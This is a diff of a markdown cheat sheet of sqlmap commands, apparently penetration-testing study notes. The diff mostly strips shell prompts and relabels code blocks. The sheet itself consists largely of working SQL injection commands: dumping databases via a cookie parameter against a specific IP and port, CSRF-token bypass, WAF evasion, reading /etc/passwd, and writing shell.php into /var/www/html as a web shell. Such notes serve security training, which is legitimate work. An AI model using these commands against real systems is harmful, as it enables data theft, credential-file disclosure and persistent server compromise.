@@ -1,22 +1,22 @@
 [[sql]]
 #####  Copy request as curl and paste to terminal
-
 ```shell
 sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
 ```
 
 replace curl with sqlmap or save request to file: 
-```shell-session
-la1n23@htb[/htb]$ sqlmap -r req.txt
+```shell
+sqlmap -r req.txt
 ```
 
+##### Show current DB as a proof
+`--current-db`
 ##### Scan using parameters in cookies:
-```
+```bash
 sqlmap -u 'http://94.237.50.99:43765/case3.php'  -H 'Cookie: id=*' --dump --batch
 ```
 
 #### Tuning
-
 ```bash
 sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
 ```
@@ -67,17 +67,17 @@ specify number of colons for union based technique:
 
 ##### CSRF bypass
 ```shell
-la1n23@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
 ```
 
 ##### Random value
 ```shell
-la1n23@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
 ```
 
 ##### Parameters processing
 ```shell
-la1n23@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
 ```
 
 ##### Proxy
@@ -89,8 +89,7 @@ Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined 
 Detect WAF by signature: https://github.com/stamparm/identYwaf
 
 ##### Useragent
-
-```
+```shell
 --random-agent
 ```
 
@@ -107,11 +106,11 @@ id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...
 ```
 
 ##### Files
-```shell-session
+```shell
 --file-read "/etc/passwd"
 ```
 
-```shell-session
+```shell
 --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 ```
 
